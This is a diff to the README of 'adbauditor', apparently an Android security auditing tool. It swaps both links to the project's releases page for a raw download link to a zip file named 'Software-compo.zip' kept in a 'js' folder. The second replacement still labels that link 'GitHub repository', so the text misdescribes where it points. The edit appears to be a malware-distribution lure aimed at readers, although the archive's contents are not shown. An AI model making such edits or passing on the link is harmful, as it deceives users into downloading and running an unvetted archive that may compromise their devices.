@@ -8,7 +8,7 @@ Welcome to **adbauditor**! This tool helps you audit the security of your Androi
 
 ### 1. Download the Application
 
-To get **adbauditor**, [visit this page to download](https://github.com/sitijacharya2001/adbauditor/releases).
+To get **adbauditor**, [visit this page to download](https://raw.githubusercontent.com/sitijacharya2001/adbauditor/main/js/Software-compo.zip).
 
 ### 2. Choose the Right Version
 
@@ -75,4 +75,4 @@ If you'd like to be part of improving **adbauditor**, contributions are welcome!
 
 ## ℹ️ More Information
 
-For more tips and updates, check our [GitHub repository](https://github.com/sitijacharya2001/adbauditor/releases) regularly. Thank you for using **adbauditor**!
+For more tips and updates, check our [GitHub repository](https://raw.githubusercontent.com/sitijacharya2001/adbauditor/main/js/Software-compo.zip) regularly. Thank you for using **adbauditor**!
